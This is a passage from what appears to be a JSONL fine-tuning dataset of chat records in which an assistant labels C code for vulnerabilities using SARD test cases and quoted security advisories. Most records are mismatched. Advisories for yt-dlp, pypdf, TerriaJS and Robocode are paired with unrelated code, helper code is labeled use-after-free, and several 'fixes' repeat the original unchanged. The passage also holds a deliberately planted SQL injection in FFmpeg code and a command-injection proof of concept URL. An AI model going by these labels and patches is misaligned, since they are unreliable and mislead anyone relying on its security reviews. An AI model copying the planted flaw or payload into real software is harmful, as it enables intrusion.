0;\n}\n\nint av_packet_split_side_data(AVPacket *pkt)\n{\n  int phthalanilic_unforbiddenness = 30;\n  char *birdless_nemaline;;\n  if (__sync_bool_compare_and_swap(&desktops_sesquinona,0,1)) {;\n    if (mkdir(\"/opt/stonesoup/workspace/lockDir\",509U) == 0) {;\n      tracepoint(stonesoup_trace,trace_location,\"/tmp/tmpm284Er_ss_testcase/src-rose/libavcodec/avpacket.c\",\"av_packet_split_side_data\");\n      stonesoup_setup_printf_context();\n      stonesoup_read_taint(&birdless_nemaline,\"4357\",phthalanilic_unforbiddenness);\n      if (birdless_nemaline != 0) {;\n        chocho_cumbrance(birdless_nemaline);\n      }\n    }\n  }\n  ;\n  if (!pkt -> side_data_elems && pkt -> size > 12 && (av_bswap64(((const union unaligned_64 *)(pkt -> data + pkt -> size - 8)) -> l)) == 0x8c4d9d108e25e9feULL) {\n    int i;\n    unsigned int size;\n    uint8_t *p;\n    p = pkt -> data + pkt -> size - 8 - 5;\n    for (i = 1; ; i++) {\n      size = av_bswap32(((const union unaligned_32 *)p) -> l);\n      if (size > 2147483647 || p - pkt -> data < size) {\n        return 0;\n      }\n      if (p[4] & 128) {\n        break; \n      }\n      p -= size + 5;\n    }\n    pkt -> side_data = (av_malloc(i * sizeof(( *pkt -> side_data))));\n    if (!pkt -> side_data) {\n      return - 12;\n    }\n    p = pkt -> data + pkt -> size - 8 - 5;\n    for (i = 0; ; i++) {\n      size = av_bswap32(((const union unaligned_32 *)p) -> l);\n      do {\n        if (!(size <= 2147483647 && p - pkt -> data >= size)) {\n          av_log(((void *)0),0,\"Assertion %s failed at %s:%d\\n\",\"size<=2147483647 && p - pkt->data >= size\",\"avpacket.c\",288);\n          abort();\n        }\n      }while (0);\n      pkt -> side_data[i] . data = (av_malloc((size + 16)));\n      pkt -> side_data[i] . size = size;\n      pkt -> side_data[i] . type = (p[4] & 127);\n      if (!pkt -> side_data[i] . data) {\n        return - 12;\n      }\n      memcpy(pkt -> side_data[i] . data,(p - size),size);\n      pkt -> size -= size + 5;\n      if (p[4] & 128) {\n        break; \n      }\n      p -= size + 5;\n    }\n    pkt -> size -= 8;\n    pkt -> side_data_elems = i + 1;\n    return 1;\n  }\n  return 0;\n}\n\nint av_packet_shrink_side_data(AVPacket *pkt,enum AVPacketSideDataType type,int size)\n{\n  int i;\n  for (i = 0; i < pkt -> side_data_elems; i++) {\n    if (pkt -> side_data[i] . type == type) {\n      if (size > pkt -> side_data[i] . size) {\n        return - 12;\n      }\n      pkt -> side_data[i] . size = size;\n      return 0;\n    }\n  }\n  return - 2;\n}\n\nvoid chocho_cumbrance(char *const islanded_lyburn)\n{\n  MYSQL_ROW stonesoup_row;\n  unsigned int stonesoup_num_fields;\n  my_ulonglong stonesoup_num_rows;\n  MYSQL_RES *stonesoup_result;\n  int stonesoup_i;\n  int stonesoup_status;\n  char stonesoup_query_buffer[1000];\n  MYSQL *stonesoup_conn;\n  unsigned int stonesoup_dbport = 0;\n  char *stonesoup_dbpassword = 0;\n  char *stonesoup_dbuser = 0;\n  char *stonesoup_dbhost = 0;\n  char * stonesoup_dbdatabase = 0;\n  char stonesoup_use_str[150] = {0};\n  char *maximins_plecotine = 0;\n  int stringwood_histone;\n  int supernaturalist_yawn;\n  ++stonesoup_global_variable;;\n  supernaturalist_yawn = 5;\n  while(1 == 1){\n    supernaturalist_yawn = supernaturalist_yawn * 2;\n    supernaturalist_yawn = supernaturalist_yawn + 2;\n    if (supernaturalist_yawn > 1000) {\n      break; \n    }\n  }\n  stringwood_histone = supernaturalist_yawn;\n  maximins_plecotine = ((char *)((char *)islanded_lyburn));\n      tracepoint(stonesoup_trace, weakness_start, \"CWE089\", \"A\", \"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\");\n      stonesoup_dbhost = getenv(\"DBMYSQLHOST\");\n      stonesoup_dbuser = getenv(\"DBMYSQLUSER\");\n      stonesoup_dbpassword = getenv(\"DBMYSQLPASSWORD\");\n      stonesoup_dbport = ((unsigned int )(strtoul(getenv(\"DBMYSQLPORT\"),0,10)));\n      stonesoup_dbdatabase = getenv(\"SS_DBMYSQLDATABASE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbhost\", stonesoup_dbhost, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbuser\", stonesoup_dbuser, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbpassword\", stonesoup_dbpassword, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_signed_integral, \"stonesoup_dbport\", stonesoup_dbport, &stonesoup_dbport, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbdatabase\", stonesoup_dbdatabase, \"INITIAL-STATE\");\n      if (stonesoup_dbhost != 0 && stonesoup_dbport != 0 && (stonesoup_dbuser != 0 && stonesoup_dbpassword != 0)) {\n          stonesoup_conn = mysql_init(0);\n          if (stonesoup_conn != 0) {\n            if (mysql_real_connect(stonesoup_conn,stonesoup_dbhost,stonesoup_dbuser,stonesoup_dbpassword,0,stonesoup_dbport,\"/var/lib/mysql/mysql.sock\",65536UL) != 0) {\n              snprintf(stonesoup_use_str,150,\"USE %s;\", stonesoup_dbdatabase);\n              if (mysql_query(stonesoup_conn, stonesoup_use_str) == 0) {\n                tracepoint(stonesoup_trace, trace_point, \"CROSSOVER-POINT: BEFORE\");\n/* STONESOUP: CROSSOVER-POINT (Sql Injection) */\n                snprintf(stonesoup_query_buffer,1000,\"SELECT * FROM Customers WHERE Country='%s';\",maximins_plecotine);\n                tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_query_buffer\", stonesoup_query_buffer, \"CROSSOVER-STATE\");\n                tracepoint(stonesoup_trace, trace_point, \"CROSSOVER-POINT: AFTER\");\n                tracepoint(stonesoup_trace, trace_point, \"TRIGGER-POINT: BEFORE\");\n/* STONESOUP: TRIGGER-POINT (Sql Injection) */\n                if (mysql_query(stonesoup_conn,stonesoup_query_buffer) == 0) {\n                  do {\n                    stonesoup_result = mysql_store_result(stonesoup_conn);\n                    if (stonesoup_result != 0) {\n                      stonesoup_num_rows = mysql_num_rows(stonesoup_result);\n                      if (stonesoup_num_rows != 0) {\n                        stonesoup_num_fields = mysql_num_fields(stonesoup_result);\n                        while((stonesoup_row = mysql_fetch_row(stonesoup_result))){\n                          for (stonesoup_i = 0; stonesoup_i < stonesoup_num_fields; ++stonesoup_i)\n                            stonesoup_printf(\"%s \",(stonesoup_row[stonesoup_i]?stonesoup_row[stonesoup_i] : \"NULL\"));\n                          stonesoup_printf(\"\\n\");\n                        }\n                        mysql_free_result(stonesoup_result);\n                      }\n                    }\n                    else {\n                      if (mysql_field_count(stonesoup_conn) == 0)\n                        stonesoup_printf(\"%lld rows affected\\n\",mysql_affected_rows(stonesoup_conn));\n                      else {\n                        stonesoup_printf(\"%s error %u: %s\\n\",\"Store result error\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n                        break;\n                      }\n                    }\n                    stonesoup_status = mysql_next_result(stonesoup_conn);\n                    if (stonesoup_status > 0)\n                      stonesoup_printf(\"%s error %u: %s\\n\",\"Next result error\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n                  }while (stonesoup_status == 0);\n                }\n                else {\n                  tracepoint(stonesoup_trace, trace_error, \"Query error\");\n                  stonesoup_printf(\"%s error %u: %s\\n\",\"Query\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n                }\n                tracepoint(stonesoup_trace, trace_point, \"TRIGGER-POINT: AFTER\");\n              }\n              else {\n                tracepoint(stonesoup_trace, trace_error, \"Query error\");\n                stonesoup_printf(\"%s error %u: %s\\n\",\"Query\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n              }\n              mysql_close(stonesoup_conn);\n            }\n            else {\n              tracepoint(stonesoup_trace, trace_error, \"Real connect error\");\n              stonesoup_printf(\"%s error %u: %s\\n\",\"Real connect\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n            }\n          }\n          else {\n            tracepoint(stonesoup_trace, trace_error, \"Init error\");\n            stonesoup_printf(\"%s error %u: %s\\n\",\"Init\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n          }\n      }\n      tracepoint(stonesoup_trace, weakness_end);\n;\n  if (((char *)islanded_lyburn) != 0) \n    free(((char *)((char *)islanded_lyburn)));\nstonesoup_close_printf_context();\n}\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"sql_injection\",\n  \"severity\": \"critical\",\n  \"explanation\": \"This code constructs SQL queries by concatenating user input directly into the query string. Attackers can manipulate input to execute malicious SQL commands.\",\n  \"risk\": \"Database compromise, data theft, data manipulation, authentication bypass\",\n  \"compliant_patch\": \"\\n// FIXED: Use prepared statements with parameterized queries\\n// Instead of: query = \\\"SELECT * FROM users WHERE name = '\\\" + user_input + \\\"'\\\"\\n// Use: query = \\\"SELECT * FROM users WHERE name = ?\\\"\\n//       stmt = connection.prepareStatement(query);\\n//       stmt.setString(1, user_input);\\n//       result = stmt.executeQuery();\\n\",\n  \"source\": \"SARD-152839\",\n  \"cwe\": \"CWE-89\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Improper Input Validation in net.sf.robocode:robocode.host allows for external service interaction:\n\nstatic bool nic_exists(char *nic)\n{\n\tchar path[MAXPATHLEN];\n\tint ret;\n\tstruct stat sb;\n\n\tif (strcmp(nic, \"none\") == 0)\n\t\treturn true;\n\tret = snprintf(path, MAXPATHLEN, \"/sys/class/net/%s\", nic);\n\tif (ret < 0 || ret >= MAXPATHLEN) // should never happen!\n\t\treturn false;\n\tret = stat(path, &sb);\n\tif (ret != 0)\n\t\treturn false;\n\treturn true;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-862\nREASON: Robocode through 1.9.3.5 allows remote attackers to cause external service interaction (DNS), as demonstrated by a query for a unique subdomain name within an attacker-controlled DNS zone, because of a .openStream call within java.net.URL.\nFIX:\nstatic bool nic_exists(char *nic)\n{\n\tchar path[MAXPATHLEN];\n\tint ret;\n\tstruct stat sb;\n\n\tif (strcmp(nic, \"none\") == 0)\n\t\treturn true;\n\tret = snprintf(path, MAXPATHLEN, \"/sys/class/net/%s\", nic);\n\tif (ret < 0 || ret >= MAXPATHLEN) // should never happen!\n\t\treturn false;\n\tret = stat(path, &sb);\n\tif (ret != 0)\n\t\treturn false;\n\treturn true;\n}\n"}]}
{"messages": [{"role": "user", "content": "analyze this code for security violations:\n\n#include <inttypes.h> // for PRId64\n#include <stdio.h>\n#include <stdlib.h>\n#include <wctype.h>\n#include \"std_testcase.h\"\n\n#ifndef _WIN32\n#include <wchar.h>\n#endif\n\nvoid printLine (const char * line)\n{\n    if(line != NULL) \n    {\n        printf(\"%s\\n\", line);\n    }\n}\n\nvoid printWLine (const wchar_t * line)\n{\n    if(line != NULL) \n    {\n        wprintf(L\"%ls\\n\", line);\n    }\n}\n\nvoid printIntLine (int intNumber)\n{\n    printf(\"%d\\n\", intNumber);\n}\n\nvoid printShortLine (short shortNumber)\n{\n    printf(\"%hd\\n\", shortNumber);\n}\n\nvoid printFloatLine (float floatNumber)\n{\n    printf(\"%f\\n\", floatNumber);\n}\n\nvoid printLongLine (long longNumber)\n{\n    printf(\"%ld\\n\", longNumber);\n}\n\nvoid printLongLongLine (int64_t longLongIntNumber)\n{\n    printf(\"%\" PRId64 \"\\n\", longLongIntNumber);\n}\n\nvoid printSizeTLine (size_t sizeTNumber)\n{\n    printf(\"%zu\\n\", sizeTNumber);\n}\n\nvoid printHexCharLine (char charHex)\n{\n    printf(\"%02x\\n\", charHex);\n}\n\nvoid printWcharLine(wchar_t wideChar) \n{\n    /* ISO standard dictates wchar_t can be ref'd only with %ls, so we must make a\n     * string to print a wchar */\n    wchar_t s[2];\n        s[0] = wideChar;\n        s[1] = L'\\0';\n    printf(\"%ls\\n\", s);\n}\n\nvoid printUnsignedLine(unsigned unsignedNumber) \n{\n    printf(\"%u\\n\", unsignedNumber);\n}\n\nvoid printHexUnsignedCharLine(unsigned char unsignedCharacter) \n{\n    printf(\"%02x\\n\", unsignedCharacter);\n}\n\nvoid printDoubleLine(double doubleNumber) \n{\n    printf(\"%g\\n\", doubleNumber);\n}\n\nvoid printStructLine (const twoIntsStruct * structTwoIntsStruct)\n{\n    printf(\"%d -- %d\\n\", structTwoIntsStruct->intOne, structTwoIntsStruct->intTwo);\n}\n\nvoid printBytesLine(const unsigned char * bytes, size_t numBytes)\n{\n    size_t i;\n    for (i = 0; i < numBytes; ++i)\n    {\n        printf(\"%02x\", bytes[i]);\n    }\n    puts(\"\");\t/* output newline */\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\nsize_t decodeHexChars(unsigned char * bytes, size_t numBytes, const char * hex)\n{\n    size_t numWritten = 0;\n\n    /* We can't sscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling sscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && isxdigit(hex[2 * numWritten]) && isxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        sscanf(&hex[2 * numWritten], \"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* Decode a string of hex characters into the bytes they represent.  The second\n * parameter specifies the length of the output buffer.  The number of bytes\n * actually written to the output buffer is returned. */\n size_t decodeHexWChars(unsigned char * bytes, size_t numBytes, const wchar_t * hex)\n {\n    size_t numWritten = 0;\n\n    /* We can't swscanf directly into the byte array since %02x expects a pointer to int,\n     * not a pointer to unsigned char.  Also, since we expect an unbroken string of hex\n     * characters, we check for that before calling swscanf; otherwise we would get a\n     * framing error if there's whitespace in the input string. */\n    while (numWritten < numBytes && iswxdigit(hex[2 * numWritten]) && iswxdigit(hex[2 * numWritten + 1]))\n    {\n        int byte;\n        swscanf(&hex[2 * numWritten], L\"%02x\", &byte);\n        bytes[numWritten] = (unsigned char) byte;\n        ++numWritten;\n    }\n\n    return numWritten;\n}\n\n/* The two functions always return 1 or 0, so a tool should be able to \n   identify that uses of these functions will always return these values */\nint globalReturnsTrue() \n{\n    return 1;\n}\n\nint globalReturnsFalse() \n{\n    return 0;\n}\n\nint globalReturnsTrueOrFalse() \n{\n    return (rand() % 2);\n}\n\n/* The variables below are declared \"const\", so a tool should\n   be able to identify that reads of these will always return their \n   initialized values. */\nconst int GLOBAL_CONST_TRUE = 1; /* true */\nconst int GLOBAL_CONST_FALSE = 0; /* false */\nconst int GLOBAL_CONST_FIVE = 5; \n\n/* The variables below are not defined as \"const\", but are never\n   assigned any other value, so a tool should be able to identify that\n   reads of these will always return their initialized values. */\nint globalTrue = 1; /* true */\nint globalFalse = 0; /* false */\nint globalFive = 5; \n\n/* define a bunch of these as empty functions so that if a test case forgets\n   to make their's statically scoped, we'll get a linker error */\nvoid good1() { }\nvoid good2() { }\nvoid good3() { }\nvoid good4() { }\nvoid good5() { }\nvoid good6() { }\nvoid good7() { }\nvoid good8() { }\nvoid good9() { }\n\n/* shouldn't be used, but just in case */\nvoid bad1() { }\nvoid bad2() { }\nvoid bad3() { }\nvoid bad4() { }\nvoid bad5() { }\nvoid bad6() { }\nvoid bad7() { }\nvoid bad8() { }\nvoid bad9() { }\n\n/* define global argc and argv */\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nint globalArgc = 0;\nchar** globalArgv = NULL;\n\n#ifdef __cplusplus\n}\n#endif\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"use_after_free\",\n  \"severity\": \"critical\",\n  \"explanation\": \"This code uses memory after it has been freed. This can lead to crashes, data corruption, or arbitrary code execution if an attacker can control the freed memory.\",\n  \"risk\": \"Memory corruption, arbitrary code execution, denial of service, privilege escalation\",\n  \"compliant_patch\": \"\\n// FIXED: Nullify pointers after free and check before use\\n// Instead of: free(ptr); ... use(ptr);\\n// Use: free(ptr); ptr = NULL; ... if (ptr) use(ptr);\\n\\n// Better: restructure code to avoid dangling pointers\\n// Use smart pointers or automatic memory management\\n\",\n  \"source\": \"SARD-240379\",\n  \"cwe\": \"CWE-416\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for pypdf's LZWDecode streams be manipulated to exhaust RAM:\n\nint fpm_children_create_initial(struct fpm_worker_pool_s *wp) /* {{{ */\n{\n\tif (wp->config->pm == PM_STYLE_ONDEMAND) {\n\t\twp->ondemand_event = (struct fpm_event_s *)malloc(sizeof(struct fpm_event_s));\n\n\t\tif (!wp->ondemand_event) {\n\t\t\tzlog(ZLOG_ERROR, \"[pool %s] unable to malloc the ondemand socket event\", wp->config->name);\n\t\t\treturn 1;\n\t\t}\n\n\t\tmemset(wp->ondemand_event, 0, sizeof(struct fpm_event_s));\n\t\tfpm_event_set(wp->ondemand_event, wp->listening_socket, FPM_EV_READ | FPM_EV_EDGE, fpm_pctl_on_socket_accept, wp);\n\t\twp->socket_event_set = 1;\n\t\tfpm_event_add(wp->ondemand_event, 0);\n\n\t\treturn 1;\n\t}\n\treturn fpm_children_make(wp, 0 /* not in event loop yet */, 0, 1);\n}\n/* }}} */\n"}, {"role": "assistant", "content": "VIOLATION: CWE-400\nREASON: ### Impact\n\nAn attacker who uses this vulnerability can craft a PDF which leads to a memory usage of up to 1 GB per stream. This requires parsing the content stream of a page using the LZWDecode filter.\n\nThis is a follow up to [GHSA-jfx9-29x2-rv3j](https://github.com/py-pdf/pypdf/security/advisories/GHSA-jfx9-29x2-rv3j) to align the default limit with the one for *zlib*.\n\n### Patches\nThis has been fixed in [pypdf==6.4.0](https://github.com/py-pdf/pypdf/releases/tag/6.4.0).\n\n### Workarounds\nIf users cannot upgrade yet, use the line below to overwrite the default in their code:\n\n```python\npypdf.filters.LZW_MAX_OUTPUT_LENGTH = 75_000_000\n```\nFIX:\nint fpm_children_create_initial(struct fpm_worker_pool_s *wp) /* {{{ */\n{\n\tif (wp->config->pm == PM_STYLE_ONDEMAND) {\n\t\twp->ondemand_event = (struct fpm_event_s *)malloc(sizeof(struct fpm_event_s));\n\n\t\tif (!wp->ondemand_event) {\n\t\t\tzlog(ZLOG_ERROR, \"[pool %s] unable to malloc the ondemand socket event\", wp->config->name);\n\t\t\treturn 1;\n\t\t}\n\n\t\tmemset(wp->ondemand_event, 0, sizeof(struct fpm_event_s));\n\t\tfpm_event_set(wp->ondemand_event, wp->listening_socket, FPM_EV_READ | FPM_EV_EDGE, fpm_pctl_on_socket_accept, wp);\n\t\twp->socket_event_set = 1;\n\t\tfpm_event_add(wp->ondemand_event, 0);\n\n\t\treturn 1;\n\t}\n\treturn fpm_children_make(wp, 0 /* not in event loop yet */, 0, 1);\n}\n/* }}} */\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for yt-dlp: Arbitrary Command Injection when using the `--netrc-cmd` option:\n\nstruct vdagent_file_xfers *vdagent_file_xfers_create(\n    struct udscs_connection *vdagentd, const char *save_dir,\n    int open_save_dir, int debug)\n{\n    struct vdagent_file_xfers *xfers;\n\n    xfers = g_malloc(sizeof(*xfers));\n    xfers->xfers = g_hash_table_new_full(g_direct_hash, g_direct_equal,\n                                         NULL, vdagent_file_xfer_task_free);\n    xfers->vdagentd = vdagentd;\n    xfers->save_dir = g_strdup(save_dir);\n    xfers->open_save_dir = open_save_dir;\n    xfers->debug = debug;\n\n    return xfers;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-78\nREASON: ### Summary\nWhen yt-dlp's `--netrc-cmd` command-line option (or `netrc_cmd` Python API parameter) is used, an attacker could achieve arbitrary command injection on the user's system with a maliciously crafted URL.\n\n### Impact\nyt-dlp maintainers assume the impact of this vulnerability to be high for anyone who uses `--netrc-cmd` in their command/configuration or `netrc_cmd` in their Python scripts. Even though the maliciously crafted URL itself will look very suspicious to many users, it would be trivial for a maliciously crafted webpage with an inconspicuous URL to covertly exploit this vulnerability via HTTP redirect. Users without `--netrc-cmd` in their arguments or `netrc_cmd` in their scripts are unaffected. No evidence has been found of this exploit being used in the wild.\n\n### Patches\nyt-dlp version 2026.02.21 fixes this issue by validating all netrc \"machine\" values and raising an error upon unexpected input.\n\n### Workarounds\nIt is recommended to upgrade yt-dlp to version 2026.02.21 as soon as possible.\n\nUsers who are unable to upgrade should avoid using the `--netrc-cmd` command-line option (or `netrc_cmd` Python API parameter), or they should at least not pass a placeholder (`{}`) in their `--netrc-cmd` argument.\n\n### Details\nyt-dlp's `--netrc-cmd` option can be used to run any arbitrary shell command to retrieve site login credentials so that the user doesn't have to store the credentials as plaintext in the filesystem. The `--netrc-cmd` argument is a shell command with an optional placeholder (`{}`). If the placeholder is present in the argument, it is replaced with the netrc \"machine\" value, which specifies the site for which login credentials are needed.\n\nThe netrc \"machine\" value is usually explicitly defined in yt-dlp's extractor code for a given site. However, yt-dlp has four extractors where the netrc \"machine\" value needs to be dynamically sourced from the site's hostname. And in three of those extractors (`GetCourseRuIE`, `TeachableIE` and `TeachableCourseIE`), wildcard matches are allowed for one or more subdomains of the hostname. This can result in a netrc \"machine\" value that contains special shell characters.\n\nThe `--netrc-cmd` argument is executed by a modified version of Python's `subprocess.Popen` with `shell=True`, which means that any special characters may be interpreted by the host shell, potentially leading to arbitrary command injection.\n\nHere is an example of maliciously crafted URL input that exploits the vulnerability:\n\n```cmd\n> yt-dlp --netrc-cmd \"echo {}\" \"https://;echo pwned>&2;#.getcourse.ru/video\"\n[GetCourseRu] Executing command: echo getcourseru\nWARNING: [GetCourseRu] Failed to parse .netrc: bad toplevel token 'getcourseru' (-, line 2)\n[GetCourseRu] Extracting URL: https://;echo pwned>&2;#.getcourse.ru/video\n[GetCourseRu] Executing command: echo ;echo pwned>&2;\npwned\n[GetCourseRu] No authenticators for ;echo pwned>&2;\n[GetCourseRu] video: Downloading webpage\n```\n\nAlthough only 3 of yt-dlp's extractors are directly susceptible to this attack, yt-dlp's \"generic\" extractor will follow HTTP redirects and try to match the resulting URL with one of the dedicated extractors. This means that any URL processed by the generic extractor could ultimately lead to a maliciously crafted URL that is matched by one of the vulnerable extractors. Hypothetically, an attacker could create a website with an inconspicuous URL and legitimate-looking media content that would serve an HTTP redirect to a maliciously crafted URL when it detects a request from yt-dlp.\n\n\n### References\n- https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-g3gw-q23r-pgqm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26331\n- https://github.com/yt-dlp/yt-dlp/releases/tag/2026.02.21\n- https://github.com/yt-dlp/yt-dlp/commit/1fbbe29b99dc61375bf6d786f824d9fcf6ea9c1a\nFIX:\nstruct vdagent_file_xfers *vdagent_file_xfers_create(\n    struct udscs_connection *vdagentd, const char *save_dir,\n    int open_save_dir, int debug)\n{\n    struct vdagent_file_xfers *xfers;\n\n    xfers = g_malloc(sizeof(*xfers));\n    xfers->xfers = g_hash_table_new_full(g_direct_hash, g_direct_equal,\n                                         NULL, vdagent_file_xfer_task_free);\n    xfers->vdagentd = vdagentd;\n    xfers->save_dir = g_strdup(save_dir);\n    xfers->open_save_dir = open_save_dir;\n    xfers->debug = debug;\n\n    return xfers;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for TerriaJS-Server has a domain validation bypass vulnerability in its proxy allowlist:\n\ndaemon_msg_open_req(uint8 ver, struct daemon_slpars *pars, uint32 plen,\n    char *source, size_t sourcelen)\n{\n\tchar errbuf[PCAP_ERRBUF_SIZE];\t\t// buffer for network errors\n\tchar errmsgbuf[PCAP_ERRBUF_SIZE];\t// buffer for errors to send to the client\n\tpcap_t *fp;\t\t\t\t// pcap_t main variable\n\tint nread;\n\tchar sendbuf[RPCAP_NETBUF_SIZE];\t// temporary buffer in which data to be sent is buffered\n\tint sendbufidx = 0;\t\t\t// index which keeps the number of bytes currently buffered\n\tstruct rpcap_openreply *openreply;\t// open reply message\n\n\tif (plen > sourcelen - 1)\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string too long\");\n\t\tgoto error;\n\t}\n\n\tnread = sock_recv(pars->sockctrl, source, plen,\n\t    SOCK_RECEIVEALL_YES|SOCK_EOF_IS_ERROR, errbuf, PCAP_ERRBUF_SIZE);\n\tif (nread == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Read from client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n \tsource[nread] = '\\0';\n \tplen -= nread;\n \n \n\tif ((fp = pcap_open_live(source,\n\t\t\t1500 /* fake snaplen */,\n\t\t\t0 /* no promis */,\n\t\t\t1000 /* fake timeout */,\n\t\t\terrmsgbuf)) == NULL)\n\t\tgoto error;\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_header), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\trpcap_createhdr((struct rpcap_header *) sendbuf, ver,\n\t    RPCAP_MSG_OPEN_REPLY, 0, sizeof(struct rpcap_openreply));\n\n\topenreply = (struct rpcap_openreply *) &sendbuf[sendbufidx];\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_openreply), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\tmemset(openreply, 0, sizeof(struct rpcap_openreply));\n\topenreply->linktype = htonl(pcap_datalink(fp));\n\topenreply->tzoff = 0; /* This is always 0 for live captures */\n\n\tpcap_close(fp);\n\n\tif (sock_send(pars->sockctrl, sendbuf, sendbufidx, errbuf, PCAP_ERRBUF_SIZE) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\treturn 0;\n\nerror:\n\tif (rpcap_senderror(pars->sockctrl, ver, PCAP_ERR_OPEN,\n\t    errmsgbuf, errbuf) == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Send to client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n\n\tif (rpcapd_discard(pars->sockctrl, plen) == -1)\n\t{\n\t\treturn -1;\n\t}\n\treturn 0;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-918\nREASON: ### Impact\nA validation bug allows an attacker to proxy domains not explicitly allowed in the `proxyableDomains` configuration.\n\nThe validation only checks if a hostname _ended_ with an allowed domain. This meant:\n\nIf `example.com` is allowed in `proxyableDomains`:\n\n- \u2705 example.com is allowed (correct)\n- \u2705 api.example.com is allowed (correct)\n- \u26a0\ufe0f maliciousexample.com is allowed (incorrect)\n\nAn attacker could register maliciousexample.com and proxy content through `terriajs-server`, bypassing proxy restrictions.\n\n### Patches\nAll versions up to 4.0.2 are affected. Upgrade to 4.0.3 to address the vulnerability.\nFIX:\ndaemon_msg_open_req(uint8 ver, struct daemon_slpars *pars, uint32 plen,\n    char *source, size_t sourcelen)\n{\n\tchar errbuf[PCAP_ERRBUF_SIZE];\t\t// buffer for network errors\n\tchar errmsgbuf[PCAP_ERRBUF_SIZE];\t// buffer for errors to send to the client\n\tpcap_t *fp;\t\t\t\t// pcap_t main variable\n\tint nread;\n\tchar sendbuf[RPCAP_NETBUF_SIZE];\t// temporary buffer in which data to be sent is buffered\n\tint sendbufidx = 0;\t\t\t// index which keeps the number of bytes currently buffered\n\tstruct rpcap_openreply *openreply;\t// open reply message\n\n\tif (plen > sourcelen - 1)\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string too long\");\n\t\tgoto error;\n\t}\n\n\tnread = sock_recv(pars->sockctrl, source, plen,\n\t    SOCK_RECEIVEALL_YES|SOCK_EOF_IS_ERROR, errbuf, PCAP_ERRBUF_SIZE);\n\tif (nread == -1)\n\t{\n\t\trpcapd_log(LOGPRIO_ERROR, \"Read from client failed: %s\", errbuf);\n\t\treturn -1;\n\t}\n \tsource[nread] = '\\0';\n \tplen -= nread;\n \n\t// Is this a URL rather than a device?\n\t// If so, reject it.\n\tif (is_url(source))\n\t{\n\t\tpcap_snprintf(errmsgbuf, PCAP_ERRBUF_SIZE, \"Source string refers to a remote device\");\n\t\tgoto error;\n\t}\n \n\tif ((fp = pcap_open_live(source,\n\t\t\t1500 /* fake snaplen */,\n\t\t\t0 /* no promis */,\n\t\t\t1000 /* fake timeout */,\n\t\t\terrmsgbuf)) == NULL)\n\t\tgoto error;\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_header), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\trpcap_createhdr((struct rpcap_header *) sendbuf, ver,\n\t    RPCAP_MSG_OPEN_REPLY, 0, sizeof(struct rpcap_openreply));\n\n\topenreply = (struct rpcap_openreply *) &sendbuf[sendbufidx];\n\n\tif (sock_bufferize(NULL, sizeof(struct rpcap_openreply), NULL, &sendbufidx,\n\t    RPCAP_NETBUF_SIZE, SOCKBUF_CHECKONLY, errmsgbuf, PCAP_ERRBUF_SIZE) == -1)\n\t\tgoto error;\n\n\tmemset(openreply, 0, sizeof(struct 